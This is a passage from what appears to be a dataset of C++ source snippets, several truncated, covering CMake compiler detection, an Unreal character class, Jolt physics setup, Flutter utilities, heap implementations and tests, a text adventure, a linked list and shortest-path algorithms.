HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "// Created by Kirobas inc. All Rights Reserved.\n\n\n#include \"Player/LMADefaultCharacter.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"Kismet/GameplayStatics.h\"\n#include \"Kismet/KismetMathLibrary.h\"\n#include \"Components/DecalComponent.h\"\n#include \"Components/InputComponent.h\"\n#include \"Components/LMAHealthComponent.h\"\n#include \"Components/LMAWeaponComponent.h\"\n#include \"Weapon/LMABaseWeapon.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Engine/Engine.h\"\n\n// Sets default values\nALMADefaultCharacter::ALMADefaultCharacter()\n{\n \t// Set this character to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\t\n\tSpringArmComponent = CreateDefaultSubobject<USpringArmComponent>(\"SpringArm\");\n\tSpringArmComponent->SetupAttachment(GetRootComponent());\n\tSpringArmComponent->SetUsingAbsoluteRotation(true);\n\tSpringArmComponent->TargetArmLength = ArmLength;\n\tSpringArmComponent->SetRelativeRotation(FRotator(YRotation, 0.0f, 0.0f));\n\tSpringArmComponent->bDoCollisionTest = false;\n\tSpringArmComponent->bEnableCameraLag = true;\n\n\tCameraComponent = CreateDefaultSubobject<UCameraComponent>(\"CameraComponent\");\n\tCameraComponent->SetupAttachment(SpringArmComponent);\n\tCameraComponent->SetFieldOfView(FOV);\n\tCameraComponent->bUsePawnControlRotation = false;\n\n\tHealthComponent = CreateDefaultSubobject<ULMAHealthComponent>(\"HealthComponent\");\n\n\tWeaponComponent = CreateDefaultSubobject<ULMAWeaponComponent>(\"Weapon\");\n\n\tbUseControllerRotationPitch = false;\n\tbUseControllerRotationYaw = false;\n\tbUseControllerRotationRoll = false;\n\n}\n\n// Called when the game starts or when spawned\nvoid ALMADefaultCharacter::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tif (IsValid(CursorMaterial))\n\t{\n\t\tCurrentCursor = UGameplayStatics::SpawnDecalAtLocation(GetWorld(), CursorMaterial, CursorSize, FVector(0));\n\t}\n\n\tOnHealthChanged(HealthComponent->GetHealth());\n\tHealthComponent->OnDeath.AddUObject(this, &ALMADefaultCharacter::OnDeath);\n\tHealthComponent->OnHealthChanged.AddUObject(this, &ALMADefaultCharacter::OnHealthChanged);\n\t\n}\n\n// Called every frame\nvoid ALMADefaultCharacter::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n\tif (!(HealthComponent->IsDead()))\n\t{\n\t\tRotationPlayerOnCursor();\n\t}\n\n\tAPlayerController* PC = UGameplayStatics::GetPlayerController(GetWorld(), 0);\n\tif (IsValid(PC))\n\t{\n\t\tFHitResult ResultHit;\n\t\tPC->GetHitResultUnderCursor(ECC_GameTraceChannel1, true, ResultHit);\n\t\tfloat FindRotatorResultYaw = UKismetMathLibrary::FindLookAtRotation(GetActorLocation(), ResultHit.Location).Yaw;\n\t\tSetActorRotation(FQuat(FRotator(0.0f, FindRotatorResultYaw, 0.0f)));\n\t\tif (CurrentCursor)\n\t\t{\n\t\t\tCurrentCursor->SetWorldLocation(ResultHit.Location);\n\t\t}\n\t}\n\t\n\tStaminaLogic();\n\n}\n\n// Called to bind functionality to input\nvoid ALMADefaultCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\tSuper::SetupPlayerInputComponent(PlayerInputComponent);\n\n\tPlayerInputComponent->BindAxis(\"MoveForward\", this, &ALMADefaultCharacter::MoveForward);\n\tPlayerInputComponent->BindAxis(\"MoveRight\", this, &ALMADefaultCharacter::MoveRight);\n\tPlayerInputComponent->BindAction(\"CameraZoomIn\", IE_Pressed, this, &ALMADefaultCharacter::CameraZoomIn);\n\tPlayerInputComponent->BindAction(\"CameraZoomOut\", IE_Pressed, this, &ALMADefaultCharacter::CameraZoomOut);\n\tPlayerInputComponent->BindAction(\"Sprint\", IE_Pressed, this, &ALMADefaultCharacter::Sprinting);\n\tPlayerInputComponent->BindAction(\"Sprint\", IE_Released, this, &ALMADefaultCharacter::Sprinting);\n\tPlayerInputComponent->BindAction(\"Fire\", IE_Pressed, WeaponComponent, &ULMAWeaponComponent::Fire);\n\tPlayerInputComponent->BindAction(\"Fire\", IE_Released, WeaponComponent, &ULMAWeaponComponent::StopFire);\n\tPlayerInputComponent->BindAction(\"Reload\", IE_Pressed, WeaponComponent, &ULMAWeaponComponent::Reload);\n\n}\n\nvoid ALMADefaultCharacter::MoveForward(float Value) {\n\tAddMovementInput(GetActorForwardVector(), Value);\n}\n\nvoid ALMADefaultCharacter::MoveRight(float Value) {\n\tAddMovementInput(GetActorRightVector(), Value);\n}\n\nvoid ALMADefaultCharacter::CameraZoomIn() {\n\tif (ArmLength > ArmLengthMin)\n\t{\n\t\tArmLength -= ArmLengthChange;\n\t\tSpringArmComponent->TargetArmLength = ArmLength;\n\t}\n}\n\nvoid ALMADefaultCharacter::CameraZoomOut() {\n\tif (ArmLength < ArmLengthMax)\n\t{\n\t\tArmLength += ArmLengthChange;\n\t\tSpringArmComponent->TargetArmLength = ArmLength;\n\t}\n}\n\nvoid ALMADefaultCharacter::Sprinting() {\n\tFVector Speed = GetCharacterMovement()->Velocity;\n\tfloat CurrSpeed = Speed.Size();\n\tfloat Direction = GetMesh()->GetAnimInstance()->CalculateDirection(Speed, GetActorRotation());\n\tif (CanSprint && !Sprinted && Direction == FMath::Clamp(Direction, -30.f, 30.f) && CurrSpeed != 0)\n\t{\n\t\t//MaxWalkSpeed = 600.0f;\n\t\tGetCharacterMovement()->MaxWalkSpeed = 1200.0f;\n\t\tSprinted = true;\n\t}\n\telse\n\t{\n\t\t//MaxWalkSpeed = 300.0f;\n\t\tGetCharacterMovement()->MaxWalkSpeed = 600.0f;\n\t\tSprinted = false;\n\t}\n}\n\nvoid ALMADefaultCharac",
    "#include \"physics.hpp\"\n\n// The Jolt headers don't include Jolt.h. Always include Jolt.h before including any other Jolt header.\n// You can use Jolt.h in your precompiled header to speed up compilation.\n#include \"../../math/conversions.hpp\"\n#include \"Jolt/Physics/Collision/Shape/CapsuleShape.h\"\n#include \"Jolt/Physics/Collision/Shape/ConvexHullShape.h\"\n#include \"Jolt/Physics/Collision/Shape/MeshShape.h\"\n\n//// Disable common warnings triggered by Jolt, you can use JPH_SUPPRESS_WARNING_PUSH / JPH_SUPPRESS_WARNING_POP to\n/// store and restore the warning state\n// JPH_SUPPRESS_WARNINGS\n\nPhysics::Physics() {\n    this->initialize_engine();\n    this->initialize_world_objects();\n}\n\nPhysics::~Physics() { this->clean_up_world(); }\n\nvoid Physics::initialize_engine() {\n    JPH::RegisterDefaultAllocator();\n\n    JPH::Trace = TraceImpl;\n    JPH_IF_ENABLE_ASSERTS(JPH::AssertFailed = AssertFailedImpl;)\n\n    JPH::Factory::sInstance = new JPH::Factory();\n    JPH::RegisterTypes();\n\n    // dynamic allocation, we don't worry about the rule of three since we never copy the physics system, there is only\n    // ever one instance\n    temp_allocator = new JPH::TempAllocatorImpl(10 * 1024 * 1024);\n    job_system = new JPH::JobSystemThreadPool(JPH::cMaxPhysicsJobs, JPH::cMaxPhysicsBarriers,\n                                              JPH::thread::hardware_concurrency() - 1);\n\n    physics_system.Init(cMaxBodies, cNumBodyMutexes, cMaxBodyPairs, cMaxContactConstraints, broad_phase_layer_interface,\n                        object_vs_broadphase_layer_filter, object_vs_object_layer_filter);\n\n    body_activation_listener = new MyBodyActivationListener();\n    contact_listener = new MyContactListener();\n\n    physics_system.SetBodyActivationListener(body_activation_listener);\n    physics_system.SetContactListener(contact_listener);\n}\n\nvoid Physics::initialize_world_objects() {\n\n    physics_system.SetGravity(JPH::Vec3(0, -40.0, 0));\n\n    JPH::BodyInterface &body_interface = physics_system.GetBodyInterface();\n\n    JPH::Array<JPH::Vec3> vertices = fibonacci_sphere(60);\n    JPH::ConvexHullShapeSettings low_poly_ball_settings(vertices, JPH::cDefaultConvexRadius);\n    JPH::ShapeSettings::ShapeResult ball_shape_result = low_poly_ball_settings.Create();\n\n    if (!ball_shape_result.IsValid()) {\n        throw std::runtime_error(\"ball shape is invalid\");\n    }\n\n    JPH::ShapeRefC ball_shape =\n        ball_shape_result\n            .Get(); // We don't expect an error here, but you can check floor_shape_result for HasError() / GetError()\n\n    JPH::BodyCreationSettings ball_creation_settings(ball_shape, JPH::RVec3(5.0, 20.0, 5.0), JPH::Quat::sIdentity(),\n                                                     JPH::EMotionType::Dynamic, Layers::MOVING);\n    JPH::Body *ball =\n        body_interface.CreateBody(ball_creation_settings); // Note that if we run out of bodies this can return nullptr\n    body_interface.AddBody(ball->GetID(), JPH::EActivation::Activate);\n    created_body_ids.push_back(ball->GetID());\n    body_interface.SetLinearVelocity(ball->GetID(), JPH::Vec3(0.0f, -5.0f, 0.0f));\n\n    create_character();\n}\n\n/**\n * \\brief For every mesh in this model, we create a physics object that represents the mesh\n */\nvoid Physics::load_model_into_physics_world(Model *model) {\n\n    JPH::BodyInterface &body_interface = physics_system.GetBodyInterface();\n\n    for (int i = 0; i < model->meshes.size(); i++) {\n\n        Mesh mesh = model->meshes[i];\n\n        JPH::TriangleList triangles;\n\n        assert(mesh.indices.size() % 3 == 0); // only contains triangles\n        for (int j = 0; j < mesh.indices.size(); j += 3) {\n            unsigned int j1 = mesh.indices[j];\n            unsigned int j2 = mesh.indices[j + 1];\n            unsigned int j3 = mesh.indices[j + 2];\n\n            glm::vec3 temp_v1 = mesh.vertices[j1].position;\n            JPH::Float3 v1 = JPH::Float3(temp_v1.x, temp_v1.y, temp_v1.z);\n\n            glm::vec3 temp_v2 = mesh.vertices[j2].position;\n            JPH::Float3 v2 = JPH::Float3(temp_v2.x, temp_v2.y, temp_v2.z);\n\n            glm::vec3 temp_v3 = mesh.vertices[j3].position;\n            JPH::Float3 v3 = JPH::Float3(temp_v3.x, temp_v3.y, temp_v3.z);\n\n            JPH::Triangle tri = JPH::Triangle(v1, v2, v3);\n\n            triangles.push_back(tri);\n        }\n\n        JPH::MeshShapeSettings settings = JPH::MeshShapeSettings(triangles);\n\n        JPH::Ref<JPH::Shape> mesh_shape;\n\n        // Create shape\n        JPH::Shape::ShapeResult result = settings.Create();\n        if (result.IsValid()) {\n            mesh_shape = result.Get();\n        } else {\n            throw std::runtime_error(\"couldn't get resulting shape\");\n        }\n\n        JPH::BodyCreationSettings mesh_settings(mesh_shape, JPH::RVec3(0.0, 0.0, 0.0), JPH::Quat::sIdentity(),\n                                                JPH::EMotionType::Static, Layers::NON_MOVING);\n        JPH::Body *mesh_body =\n            body_interface.CreateBody(mesh_settings); // Note that if we run out of bodies this can return",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <random>\n\n#include <catch2/catch_test_macros.hpp>\n#include <catch2/benchmark/catch_benchmark.hpp>\n\n#include \"ultl/ultl.hpp\"\n\nTEST_CASE(\"test modifiers of `ultl::leftist_heap`\", \"[leftist_heap]\") {\n  ultl::leftist_heap<int> heap;\n\n  SECTION(\"push a single int value `1`.\") {\n    heap.push(1);\n\n    REQUIRE(heap.size() == 1);\n    REQUIRE(heap.top() == 1);\n  }\n\n  SECTION(\"push two integers and get the larger one.\") {\n    heap.push(514);\n    heap.push(114);\n\n    REQUIRE(heap.top() == 514);\n\n    heap.pop();\n    REQUIRE(heap.top() == 114);\n  }\n\n  SECTION(\"push and pop 1,000,000 elements\") {\n    constexpr int N = 1'000'000;\n\n    for (int i = 0; i < N; ++i)\n      heap.push(i);\n    REQUIRE(heap.top() == N - 1);\n    REQUIRE(heap.size() == N);\n\n    for (int i = N; i > 0; --i) {\n      REQUIRE(heap.top() == i - 1);\n      heap.pop();\n    }\n    REQUIRE(heap.empty());\n  }\n}\n\nTEST_CASE(\"test `ultl::leftist_heap::emplace`\", \"[leftist_heap]\") {\n  ultl::leftist_heap<std::string> heap;\n\n  heap.emplace(10, 'a');\n  heap.emplace(\"aaaaa\");\n\n  REQUIRE(heap.size() == 2);\n  REQUIRE(heap.top() == std::string(10, 'a'));\n}\n\nTEST_CASE(\"test `ultl::leftist_heap::merge`\", \"[leftist_heap]\") {\n  ultl::leftist_heap<int> odd{1, 3, 5, 7, 9}, even{2, 4, 6, 8, 10};\n\n  auto m1 = odd;\n  m1.merge(even);\n  REQUIRE(m1.size() == 10);\n  for (int i = 10; i > 0; --i) {\n    REQUIRE(m1.top() == i);\n    m1.pop();\n  }\n\n  auto m2 = even;\n  m2.merge(std::move(odd));\n  REQUIRE(m2.size() == 10);\n  for (int i = 10; i > 0; --i) {\n    REQUIRE(m2.top() == i);\n    m2.pop();\n  }\n}\n\nTEST_CASE(\"benchmark `ultl::leftist_heap::merge`\", \"[leftist_heap]\") {\n  constexpr int N = 10'000;\n  ultl::leftist_heap<uint64_t> a, b;\n  std::mt19937 rng(Catch::getCurrentContext().getConfig()->rngSeed());\n\n  for (int i = 0; i < N; ++i) {\n    a.push(rng());\n    b.push(rng());\n  }\n\n  SECTION(\"merge with copying\") {\n    BENCHMARK(\"copy and merge\") {\n      a.merge(b);\n    };\n  }\n\n  SECTION(\"merge with moving\") {\n    BENCHMARK(\"move and merge\") {\n      a.merge(std::move(b));\n    };\n  }\n}\n",
    "#include \"Heap.h\"\n\nvoid Heap::sift_up(int index) {\n    while ((arr[(index-1) / 2] > arr[index]) && index > 0) {\n        int t = arr[(index-1) / 2];\n        arr[(index-1) / 2] = arr[index];\n        arr[index] = t;\n        index = (index-1) / 2;\n    }\n}\n\nvoid Heap::sift_down(int index) {\n    int left = 2 * index + 1;\n    int right = 2 * index +2;\n    int child = left;\n    if (left < arr.size() && right < arr.size() && arr[left] > arr[right]) child = right;\n    if (arr.size() > child && arr[index] > arr[child]) {\n        int t = arr[child];\n        arr[child] = arr[index];\n        arr[index] = t;\n    }\n    else return;\n    sift_down(child);\n}\n\nvoid Heap::heapify() {\n    int n = arr.size();\n    for (int i = n/2 - 1; i >= 0; i--) {\n        sift_down(i);\n    }\n}\n\nvoid Heap::push(int value) {\n    arr.push_back(value);\n    sift_up(arr.size() - 1);\n}\n\nvoid Heap::pop() {\n    if (arr.empty()) return;\n    arr[0] = arr.back();\n    arr.pop_back();\n    if (!arr.empty()) sift_down(0);\n}\n\nint Heap::top() {\n    if (arr.empty()) return -1;\n    return arr[0];\n}\n\nvoid Heap::print(int index, int depth) {\n    if (index < arr.size()) {\n        print(2 * index + 2, depth + 1);\n        for (int i = 0; i < depth; ++i) {\n            std::cout << \"  \";\n        }\n        std::cout << arr[index] << std::endl;\n        print(2 * index + 1, depth + 1);\n    }\n}\n",
    "#include \"player.h\"\n#include \"rooms.h\"\n#include <algorithm>\n#include <ctime>\n#include <cstdlib>\n#include <iostream>\n#include <cctype>\n#include <string>\n\n//Following two functions are helpers.\nstd::string getDirectionName(const char direction) {\n    switch(direction) {\n        case 'n':\n            return \"north\";\n        case 's': \n            return \"south\";\n        case 'e':\n            return \"east\";\n        case 'w':\n            return \"west\";\n    }\n    return \"ERROR\"; //To avoid warnings, but also for any problems with this function.\n}\n\nint getExit(const Rooms &room, const char direction) {\n    switch(direction)\n    {\n        case 'n':\n            return room.north;\n        case 's':\n            return room.south;\n        case 'e':\n            return room.east;\n        case 'w':\n            return room.west;\n    }\n    return 0; //To avoid warnings.\n}\n\nPlayer::Player() {\n    char confirmation;\n    do {\n        std::cout << \"Please enter your character's name: \";\n        getline(std::cin, name, '\\n');\n        std::cout << \"Are you sure you want \" << name << \" to be your name (y or n)? \";\n        std::cin >> confirmation;\n        std::cin.get(); //Gets rid of newline at the end of confirmation.\n    } while(tolower(confirmation) != 'y');\n\n    atk = 5; //Starting atk = 5;\n    maxHP = currentHP = 10; //Starting HP = 10\n}\n\nconst int Player::getAttack() {\n    return atk;\n}\n\nconst int Player::getCurrentHP() {\n    return currentHP;\n}\n\nconst int Player::getMaxHP() {\n    return maxHP;\n}\n\nconst std::string Player::getPlayerName() {\n    return name;\n}\n\nvoid look(const Rooms &room) {\n    std::cout << '\\n' << room.name << '\\n' << room.description << '\\n';\n    std::cout << '\\n' << room.ASCIIRoomArt << std::endl;\n\n    std::cout << \"\\nExits:\";\n    if(-1 < room.north) std::cout << \" n\";\n    if(-1 < room.south) std::cout << \" s\";\n    if(-1 < room.east) std::cout << \" e\";\n    if(-1 < room.west) std::cout << \" w\";\n    std::cout << std::endl;\n    return;\n}\n\nvoid move(const Rooms *room, size_t &currentRoom) {\n    char exitChoice;\n    while(true) {\n        std::cout << \"Which exit would you like to take? \";\n        std::cin >> exitChoice;\n\n        switch(exitChoice) {\n            case 'n': case 's' : case 'e' : case 'w':\n                //Checks whether there is an exit there.\n                if(-1 == getExit(room[currentRoom], exitChoice)) {\n                    std::cout << \"You can't go \" << getDirectionName(exitChoice) << '!' << std::endl;\n                    break;\n                }\n                \n                //Following three lines of code is for a valid direction input.\n                std::cout << \"\\nYou moved \" << getDirectionName(exitChoice) << '.' << std::endl;\n                currentRoom = getExit(room[currentRoom], exitChoice); \n                return;\n            default:\n                std::cout << \"Invalid exit!\" << std::endl;\n                break;\n        }\n    }\n}\n\nvoid Player::displayStats() {\n    std::cout << \"\\n\\033[4m\" << name << \"'s stats\\033[0m\" << std::endl; //Underlined playerName's stats.\n    std::cout << \"HP: \" << currentHP << '/' << maxHP << std::endl;\n    std::cout << \"ATK: \" << atk << std::endl;\n    return;\n}\n\nbool Player::combat(Rooms &room, Inventory &inventory) {\n    //Following three lines print enemy info.\n    std::cout << '\\n' << name << \" has encountered \" << room.enemy->enemyName << '!' << std::endl;\n    if(!room.enemy->enemyDialogue.empty()) std::cout << room.enemy->enemyName << \": \" << room.enemy->getEnemyDialogue() << std::endl;\n    if(!room.enemy->ASCIIEnemyArt.empty()) std::cout << room.enemy->getASCIIEnemyArt() << std::endl;\n\n    int turn = 0; //Turn counter.\n    const std::string itemNames[] = {\"health potion\", \"max health potion\", \"attack potion\"}; //For item drops.\n    srand(time(NULL)); //For randomizing which item is dropped from killing enemies.\n\n    while(true) {\n        char choice;\n\n        switch(turn % 2) {\n            case 0: //Player's turn.\n                displayStats();\n                room.enemy->displayEnemyStats();\n\n                //Prompts user for turn choice, checks for valid choice, and executes commands based on letter choice.\n                while(true) {\n                    std::cout << \"\\n\\033[4mPlease select your move\\033[0m\\nA) Attack\\nI) Inventory\\nR) Run\\nPlease enter your letter choice: \";\n                    std::cin >> choice;\n                    choice = tolower(choice);\n                    if(choice != 'a' && choice != 'i' && choice != 'r') std::cout << \"Invalid choice!\" << std::endl;\n                    else {\n                        std::cin.get(); //Gets rid of the '\\n' at the end of the choice.\n                        break;\n                    }\n                }\n\n                switch(choice) {\n                    case 'a': //Attack.\n                        std::cout << '\\n' << name << \" attacked the \" << room.enemy->getEnemyName() << \" for \" << getAttack() << \" damage!\" << std::endl;\n                        room.enemy->HP = std::max",
    "#include <iostream>\n\nusing namespace std;\n\n/* \n    # Lista Doblemente Enlazada #\n*/\n\nstruct nodeDE{\n    // data\n    int data;\n\n    // pointers to move around\n    nodeDE* next = NULL;\n    nodeDE* back = NULL;\n};\n\n/* test\nvoid sort2(nodeDE* &list, int data){\n        // version 2 usando 2 punteros\n        if (list == NULL){\n            list = new nodeDE;\n            list->data = data;\n        } else {\n            nodeDE* aux = list;\n            nodeDE* auxanterior = list;\n            nodeDE* newNode = new nodeDE;\n            while((aux != NULL) || (aux->data < data)){\n                if (auxanterior->next == NULL)\n                    aux = auxanterior->next; \n                auxanterior = aux->next;\n            }\n            newNode->data = data;\n            newNode->next = aux;\n            newNode->back = auxanterior->back;\n            if (newNode->back == NULL){\n                list = newNode;\n                auxanterior->back = list;\n            } else {\n                auxanterior->back->next = newNode;\n                auxanterior->back = newNode;\n            }\n        }\n    }\n*/\n\nvoid insert2(nodeDE* &list, int data){\n    nodeDE* nuevo_nodo = new nodeDE;\n    nuevo_nodo->data = data;\n    if ((list == NULL) || (data < list->data))\n    { // inserta el elemento al principio\n        nuevo_nodo->next = list;\n        if (list != NULL)\n            list->back = nuevo_nodo;\n        list = nuevo_nodo;\n    } else {\n        nodeDE* aux = list;\n        while((aux->next != NULL) && (aux->next->data < data))\n            aux = aux->next;\n        nuevo_nodo->next = aux->next;\n        nuevo_nodo->back = aux;\n        if (aux->next != NULL)\n            aux->next->back = nuevo_nodo;\n        aux->next = nuevo_nodo;\n    }\n}\n\nvoid sorted_insert(nodeDE* &list, int data){\n    if (list == NULL){\n        list = new nodeDE;\n        list->data = data;\n    } else {\n        nodeDE* aux = list;\n        nodeDE* newNode = new nodeDE;\n        while ((aux->data < data) && (aux->next != NULL))\n            aux = aux->next;\n        // setting new node\n        newNode->data = data;\n        // if the node has to be placed between others:\n        if ((aux->data > data) || (aux->next != NULL)){\n            newNode->next = aux;\n            newNode->back = aux->back;\n            // linking new node between the old ones\n            if (aux->back == NULL)\n                list = newNode; //placing the node at the first place\n            else\n                aux->back->next = newNode;\n            aux->back = newNode;\n        } else {\n            // if the node has to be at the end of the list:\n            newNode->back = aux;\n            aux->next = newNode;\n        }\n    }\n}\n\nvoid getNodes(nodeDE* list){\n    while(list != NULL){\n        cout << list->data << endl;\n        list = list->next;\n    }\n}\n\nint main(int argc, const char** argv) {\n    nodeDE* list = NULL;\n    for (int i = 1; i < 5; i++)\n        insert2(list,i*2);\n    getNodes(list);\n    return 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <chrono>\n\nusing namespace std;\nusing namespace std::chrono;\n\nvector<vector<pair<int, int>>> makeAdjList(int, const vector<vector<int>>&);\nint findCheapestFlightWithDijkstra(int, const vector<vector<pair<int, int>>>&, int, int);\nint findCheapestFlightWithBellmanFord(int, const vector<vector<pair<int, int>>>&, int, int);\n\n\nint main() {\n    vector<vector<int>> flights = {{0, 1, 120}, {1, 2, 150}, {2, 0, 110}, {1, 3, 600}, {2, 3, 200}};\n    vector<vector<int>> flights2 = {{0, 1, 500}, {0, 2, 700}, {2, 1, -400}, {1, 3, 100}};\n\n\n    vector<vector<pair<int, int>>> adjList = makeAdjList(4, flights);\n    vector<vector<pair<int, int>>> adjList2 = makeAdjList(4, flights2);\n\n    auto start = high_resolution_clock::now();\n    int answerByDijkstra = findCheapestFlightWithDijkstra(4, adjList2, 0, 3);\n    auto stop = high_resolution_clock::now();\n    auto durationOfDijkstra = duration_cast<microseconds>(stop - start);\n\n    start = high_resolution_clock::now();\n    int answerByBellmanFord = findCheapestFlightWithBellmanFord(4, adjList2, 0, 3);\n    stop = high_resolution_clock::now();\n    auto durationOfBellmanFord = duration_cast<microseconds>(stop - start);\n\n    cout << \"Shortest cost by Dijkstra: \" << answerByDijkstra << endl;\n    cout << \"Shortest cost by Bellman Ford: \" << answerByBellmanFord << endl;\n    cout << endl;\n    cout << \"Runtime of Dijkstra: \" << durationOfDijkstra.count() << endl;\n    cout << \"Runtime of Bellman-Ford: \" << durationOfBellmanFord.count() << endl;\n}\n\n/*\n * makeAdjList:\n * Converts vector<vector<int>> to an adjacency list vector<vector<pair<int, int>>>\n * Receives: n: Number of vertices (= airports) in the graph\n *           flights: Represents edges, {{Origin Apt, Dest Apt, Cost}, {Origin Apt, Dest Apt, Cost}, ... }\n * Returns: adjList: {Origin Apt: {Dest Apt, Cost}, {Dest Apt, Cost}, Origin Apt: {Dest Apt, Cost}... }\n */\nvector<vector<pair<int, int>>> makeAdjList(int n, const vector<vector<int>>& flights) {\n    vector<vector<pair<int, int>>> adjList(n);\n    // (n) creates n empty vectors in adjList, without this, push_back() won't work.\n    for (auto flight : flights) {\n        adjList[flight[0]].push_back({flight[1], flight[2]});\n    }\n    return adjList;\n}\n\n/*\n * findCheapestFlightWithDijkstra:\n * Implements Dijkstra's algorithm, using priority queue to always pop the cheapest airport.\n * Receives : n: Number of vertices (= airports) in the graph\n *            adjList: Adjacency list, please refer to makeAdjList()\n *            src: Origin airport\n *            dst: Destination airport\n * Returns: costs[dst]: Cheapest cost from src to dst\n */\nint findCheapestFlightWithDijkstra(int n, const vector<vector<pair<int, int>>>& adjList, int src, int dst) {\n    vector<bool> visited(n, false); // We don't really need this boolean vector for a graph only with non-negative weights\n    unordered_map<int, int> costs; // Stores the cheapest cost from src\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> minHeap;\n    // Not for storage, but for always accessing the cheapest airport\n    // {{Cost, Dest Apt}, {Cost, Dest Apt}, ... }\n\n    for (int i = 0; i < n; i++) {\n        if (i == src) costs.insert({i, 0});\n        else costs.insert({i, INT_MAX});\n    }\n\n    minHeap.push({costs[src], src});\n\n    while (!minHeap.empty()) {\n        auto current = minHeap.top(); // {Cost, Dest Apt}\n        int cost = current.first;\n        int airport = current.second;\n        visited[airport] = true;\n        minHeap.pop();\n\n        for (auto neighbor : adjList[airport]) { // neighbor: {Dest Apt, Cost}\n            int neighborApt = neighbor.first;\n            int flightCost = neighbor.second;\n            if (!visited[neighborApt] && cost + flightCost < costs[neighborApt]) {\n                costs[neighborApt] = cost + flightCost;\n                minHeap.push({costs[neighborApt], neighborApt});\n                // We only push airports connecting (directly and indirectly) to src airport\n            }\n        }\n    }\n    return costs[dst];\n}\n\n/*\n * findCheapestFlightWithBellmanFord:\n * Implements Bellman-Ford algorithm, simply using loop to iterate all airports (n-1) times.\n * Receives : n: Number of vertices (= airports) in the graph\n *            adjList: Adjacency list, please refer to makeAdjList()\n *            src: Origin airport\n *            dst: Destination airport\n * Returns: costs[dst]: Cheapest cost from src to dst\n */\nint findCheapestFlightWithBellmanFord(int n, const vector<vector<pair<int, int>>>& adjList, int src, int dst) {\n    unordered_map<int, int> costs;\n\n    for (int i = 0; i < n; i++) {\n        if (i == src) costs.insert({i, 0});\n        else costs.insert({i, INT_MAX});\n    }\n\n    for (int i = 1; i < n; i++) { // Simply loops traversal of (n-1) times\n        for (auto current: costs) {\n            int airport = current.first;\n            int cost = current.second;\n            if (cost == INT_MAX) continue;\n   ",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 